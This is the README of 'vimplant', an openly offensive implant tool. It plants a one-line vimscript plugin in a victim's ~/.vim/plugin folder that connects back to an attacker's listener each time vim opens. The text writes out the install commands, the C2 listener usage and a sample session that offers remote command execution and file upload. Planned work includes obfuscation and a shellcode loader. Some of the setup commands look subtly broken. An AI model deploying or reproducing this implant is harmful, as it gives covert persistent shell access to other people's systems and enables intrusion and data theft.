# Summary

Minimal vim "plugin" for an implant to give a reverse shell.  Plugin is in quotes because it is literally just a single line of vimscript, and the vimplant server makes it easy-ish to interact with. The C2 server is just a modification of the demoserver.py that is used to show how vim uses `ch_open`. 

# Usage

## Prepare the server

```
python3 vimplant.py -p <CALLBACK_PORT>




python3 vimplant.py -h
usage: vimplant.py [-h] -p PORT

Start listener for vimplant

options:
  -h, --help       show this help message and exit
  -p, --port PORT  Port to listen for callbacks
```

## Install the "plugin" and set your callback host and port

```
mkdir -p ~/.vim/plugin/
echo ":let handle = ch_open('LHOST:LPORT')" > ~/.vim/plugin/vimplant.vim
sed -i 's:<CALLBACK_HOST>:LHOST:'> ~/.vim/plugin/vimplant.vim
sed -i 's:<CALLBACK_PORT>:LPORT:'> ~/.vim/plugin/vimplant.vim
```

## Wait for a callback

Callbacks will occur whenever the targeted user opens up vim.


```
python3 vimplant.py -p 4444
[*] Waiting for connection on port 4444
[+] Callback received from 127.0.0.1. Non-Interactive shell opened.
>help
vimplant help
         exit - close the connection
         put <local_file> <remote_destination> - upload a local file
         !<local_command> - execute a local command
```

# Features

Remote command execution.

Local command execution by prepending `!` to your command.

Upload files.

# TODO

- there is a max download/upload size that I have not spent time working out
- encrypted comms
- implement a shellcode loader
- download files
- Write some obfuscating functions
- Graceful shutdown.  Current clean shutdown depends on the client closing vim.
- Use more vim builtins.  Current implementation pretty much just shells out to `system()`, but I bet we could do better.
